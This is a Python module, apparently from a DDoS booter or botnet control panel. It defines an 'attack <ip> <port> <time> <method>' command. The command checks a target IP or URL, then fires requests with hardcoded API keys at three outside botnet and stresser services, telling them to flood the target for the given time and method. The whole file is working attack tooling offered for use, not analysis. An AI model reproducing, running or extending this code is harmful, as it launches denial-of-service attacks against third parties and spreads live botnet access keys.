import os, sys, time, requests, socket
from urllib.parse import urlparse

from ..utils.main import *

def uri_exists_get(uri: str) -> bool:
    try:
        result = urlparse(uri)
        return True
    except:
        return False

def real_ip(ip: str):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False
# Proper Attack Function With Validation Why Not Be Secure And Not Depend On The Apis Backend ! :) By Daddy Clever


def temporary_attack(socket, argv):
    if len(argv) == 5:
        ip = argv[1]
        check1 = uri_exists_get(ip)
        check2 = real_ip(ip)
        if check1 == True or check2 == True:
            port = argv[2]
            time = argv[3]
            try:
                check1 = int(port)
                check2 = int(time)
            except:
                socket.send("PLEASE PROVIDE A VALID VALUE FOR PORT AND TIME WE HAVE DETECTED YOU HAVENT GAVE AN INT IN THE FEILDS !\r\n".encode())
                return None
            method = argv[4]
            socket.send("Sending attack, please wait....\r\n".encode())
            send = requests.get(f"https://primacyapi.net/client/botnet/api.php?key=RDiPTNVewIpkHNYN&host={ip}&port={port}&time={time}&method={method}").text
            send2 = requests.get(f"https://gamma-api.cc/panel/api/api.php?key=76DNgR7VD9j5sux8&host={ip}&port={port}&time={time}&method={method}").text
            send3 = requests.get(f"https://voidapi.xyz/panel/api/api.php?key=MrsSqqOYhdxQm2Tc&host={ip}&port={port}&time={time}&method={method}").text
            print(send) # WHY ARE WE PRINTING RESPONSE ????
            print(send2) # WHY ARE WE PRINTING RESPONSE ????
            socket.send(f"Attack sent to: {ip}:{port} for {time} seconds with {method}\r\n".encode())
        else:
            socket.send("Sorry But You Need To Provide A Real Ip Or Url\r\n".encode())
    else:
        socket.send(f"[x] Error, Invalid Argument\r\nUsage: attack <ip> <port> <time> <method>\r\nExmaple: attack 5.5.5.5 80 300 UDP\r\n".encode())